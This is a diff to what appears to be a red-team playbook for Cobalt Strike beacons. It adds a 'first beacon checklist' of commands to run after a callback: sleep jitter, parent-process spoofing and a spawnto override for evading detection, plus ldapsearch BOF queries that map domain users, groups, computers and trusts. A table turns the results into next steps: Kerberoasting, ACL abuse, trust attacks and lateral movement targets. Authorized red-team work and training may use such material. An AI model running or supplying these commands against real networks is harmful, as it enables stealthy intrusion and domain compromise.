@@ -103,15 +103,37 @@ beacon> getpwd    // invalid — does not exist
 
 ### First Beacon Checklist — Run Immediately After Callback
 
-Before running any post-ex commands, set beacon context to reduce OPSEC exposure:
+**Step 1 — beacon context (do this first, every beacon):**
 
 ```cs
 beacon> sleep 3 20                                      // reduce check-in noise
 beacon> ps                                              // get process list
-beacon> ppid <svchost.exe PID>                          // spoof parent — see note below
+beacon> ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
 beacon> spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
 beacon> getuid                                          // confirm user context
 ```
+
+**Step 2 — ldapsearch immediately after (OPSEC-🟢SAFE — do this on every beacon without exception):**
+
+ldapsearch is a BOF — no child process, no event logs, runs in beacon thread. It is the
+fastest and safest way to map the entire domain. Run it before making any attack decisions.
+
+```cs
+// Single query — hits users, computers, and groups in one shot
+beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
+
+// Trust enumeration
+beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
+```
+
+**What to look for immediately in the output:**
+
+| Finding | Next action |
+|---------|------------|
+| Account with `servicePrincipalName` set | Kerberoast candidate |
+| `adminCount=1` with no DA group membership | Leftover ACLs — check with BloodHound |
+| `trustPartner` results | Forest/domain trust attack paths |
+| Computer names and roles (DB, FS, DC) | Plan lateral movement targets |
 
 ---
 
